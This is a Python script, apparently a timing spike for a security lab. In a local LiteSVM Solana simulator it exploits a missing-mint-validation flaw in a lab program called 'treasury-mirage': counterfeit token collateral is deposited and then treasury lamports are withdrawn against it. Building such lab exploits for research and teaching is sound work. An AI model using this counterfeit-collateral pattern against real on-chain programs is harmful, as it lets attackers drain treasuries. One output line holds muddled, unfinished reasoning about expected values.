import time
from pathlib import Path
import base58

from solders.litesvm import LiteSVM
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import VersionedTransaction
from solders.system_program import ID as SYS_PROGRAM_ID

# Token Program
TOKEN_PROGRAM_ID = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")

# Our Program ID
PROGRAM_ID = Pubkey.from_string("Mirage1111111111111111111111111111111111111")

def get_discriminator(namespace: str, name: str) -> bytes:
    import hashlib
    preimage = f"{namespace}:{name}"
    return hashlib.sha256(preimage.encode()).digest()[:8]

def create_spl_token_account_data(mint: Pubkey, owner: Pubkey, amount: int) -> bytes:
    # Basic SPL Token Account layout (165 bytes)
    # mint (32) + owner (32) + amount (8) + delegateOption (4) + delegate (32) + state (1) + ...
    data = bytearray(165)
    data[0:32] = bytes(mint)
    data[32:64] = bytes(owner)
    data[64:72] = amount.to_bytes(8, "little")
    # State = 1 (Initialized)
    data[108] = 1
    return bytes(data)

def main():
    print("--- Starting LiteSVM Spike ---")
    t_start = time.time()
    
    # 1. Boot LiteSVM
    svm = LiteSVM()
    
    # Load Program
    so_path = Path("lab_templates/research-labs/treasury-mirage@v1/treasury_mirage.so")
    with open(so_path, "rb") as f:
        so_bytes = f.read()
    
    svm.add_program(PROGRAM_ID, so_bytes)
    t_boot = time.time()
    print(f"[Timing] Boot & Load Program: {t_boot - t_start:.4f}s")
    
    # 2. Seed Initial State
    payer = Keypair()
    svm.airdrop(payer.pubkey(), 10_000_000_000) # 10 SOL
    
    attacker = Keypair()
    svm.airdrop(attacker.pubkey(), 1_000_000_000) # 1 SOL

    # Seed Treasury Vault
    treasury_pda, treasury_bump = Pubkey.find_program_address([b"treasury"], PROGRAM_ID)
    from solders.account import Account
    svm.set_account(
        treasury_pda,
        Account(
            lamports=5_000_000_000,
            data=b"",
            owner=PROGRAM_ID,
            executable=False,
            rent_epoch=0
        )
    )
    initial_treasury = svm.get_account(treasury_pda).lamports
    
    # Seed Position
    position_pda, position_bump = Pubkey.find_program_address([b"position", bytes(attacker.pubkey())], PROGRAM_ID)
    
    # Seed Counterfeit Token Setup
    counterfeit_mint = Keypair().pubkey()
    counterfeit_token_account = Keypair()
    
    # Seed Official Token Setup
    official_mint = Keypair().pubkey()
    vault_token_account = Keypair()

    # Manually insert token accounts using set_account
    from solders.account import Account
    
    svm.set_account(
        counterfeit_token_account.pubkey(),
        Account(
            lamports=1_000_000,
            data=create_spl_token_account_data(counterfeit_mint, attacker.pubkey(), 100_000),
            owner=TOKEN_PROGRAM_ID,
            executable=False,
            rent_epoch=0
        )
    )
    
    svm.set_account(
        vault_token_account.pubkey(),
        Account(
            lamports=1_000_000,
            data=create_spl_token_account_data(counterfeit_mint, treasury_pda, 0),
            owner=TOKEN_PROGRAM_ID,
            executable=False,
            rent_epoch=0
        )
    )
    
    t_seed = time.time()
    print(f"[Timing] State Seeding: {t_seed - t_boot:.4f}s")

    # 3. Initialize Position
    init_ix = Instruction(
        PROGRAM_ID,
        get_discriminator("global", "initialize"),
        [
            AccountMeta(position_pda, is_signer=False, is_writable=True),
            AccountMeta(attacker.pubkey(), is_signer=True, is_writable=True),
            AccountMeta(SYS_PROGRAM_ID, is_signer=False, is_writable=False),
        ]
    )
    from solders.transaction import Transaction
    
    tx_init = Transaction(
        [payer, attacker],
        Message.new_with_blockhash([init_ix], payer.pubkey(), svm.latest_blockhash()),
        svm.latest_blockhash()
    )
    
    svm.send_transaction(tx_init)

    # 4. Deposit Counterfeit Collateral
    amount_to_deposit = 50_000
    deposit_data = get_discriminator("global", "deposit_collateral") + amount_to_deposit.to_bytes(8, "little")
    
    deposit_ix = Instruction(
        PROGRAM_ID,
        deposit_data,
        [
            AccountMeta(position_pda, is_signer=False, is_writable=True),
            AccountMeta(counterfeit_token_account.pubkey(), is_signer=False, is_writable=True),
            AccountMeta(vault_token_account.pubkey(), is_signer=False, is_writable=True),
            AccountMeta(attacker.pubkey(), is_signer=True, is_writable=True),
            AccountMeta(TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),
        ]
    )
    
    tx_deposit = Transaction(
        [payer, attacker],
        Message.new_with_blockhash([deposit_ix], payer.pubkey(), svm.latest_blockhash()),
        svm.latest_blockhash()
    )
    
    t_pre_deposit = time.time()
    res_deposit = svm.send_transaction(tx_deposit)
    t_post_deposit = time.time()
    print(f"[Timing] Deposit Exec: {t_post_deposit - t_pre_deposit:.4f}s | Result: {res_deposit}")
    
    # 5. Withdraw Against Credit
    amount_to_withdraw = 50_000
    withdraw_data = get_discriminator("global", "withdraw_against_credit") + amount_to_withdraw.to_bytes(8, "little")
    
    withdraw_ix = Instruction(
        PROGRAM_ID,
        withdraw_data,
        [
            AccountMeta(position_pda, is_signer=False, is_writable=True),
            AccountMeta(treasury_pda, is_signer=False, is_writable=True),
            AccountMeta(attacker.pubkey(), is_signer=False, is_writable=True), # Reward account
            AccountMeta(attacker.pubkey(), is_signer=True, is_writable=True),
            AccountMeta(SYS_PROGRAM_ID, is_signer=False, is_writable=False),
        ]
    )
    
    tx_withdraw = Transaction(
        [payer, attacker],
        Message.new_with_blockhash([withdraw_ix], payer.pubkey(), svm.latest_blockhash()),
        svm.latest_blockhash()
    )
    
    t_pre_withdraw = time.time()
    res_withdraw = svm.send_transaction(tx_withdraw)
    t_post_withdraw = time.time()
    print(f"[Timing] Withdraw Exec: {t_post_withdraw - t_pre_withdraw:.4f}s | Result: {res_withdraw}")

    # 6. Read State and Verify
    t_pre_verify = time.time()
    
    pos_account = svm.get_account(position_pda)
    pos_credit = int.from_bytes(pos_account.data[8+32:8+32+8], "little") # Skip disc & pubkey
    
    treasury_lamports = svm.get_account(treasury_pda).lamports
    attacker_lamports = svm.get_account(attacker.pubkey()).lamports
    
    print("\n--- State Verification ---")
    print(f"Counterfeit Credit: {pos_credit} (Expected: 50000 - 2000000000 due to subtraction, wait, our logic subtracted. Let's see if withdraw succeeded.)")
    print(f"Treasury Lamports: {treasury_lamports} (Expected: {initial_treasury - amount_to_withdraw})")
    
    if treasury_lamports < initial_treasury:
        print("✅ Exploit Success: Treasury lamports decreased by legitimate withdrawal!")
        print("✅ Missing Mint Validation vulnerability confirmed.")
    else:
        print("❌ Exploit Failed.")
        
    t_post_verify = time.time()
    print(f"[Timing] State Read & Verify: {t_post_verify - t_pre_verify:.4f}s")
    
    # 7. Reconstruct/Reset the VM
    t_pre_reset = time.time()
    svm2 = LiteSVM()
    svm2.add_program(PROGRAM_ID, so_bytes)
    svm2.airdrop(treasury_pda, 5_000_000_000)
    reset_treasury = svm2.get_account(treasury_pda).lamports
    t_post_reset = time.time()
    print(f"\n[Timing] VM Reconstruct/Reset: {t_post_reset - t_pre_reset:.4f}s")
    print(f"Reset Treasury Lamports: {reset_treasury} (Clean VM restored)")

if __name__ == "__main__":
    main()
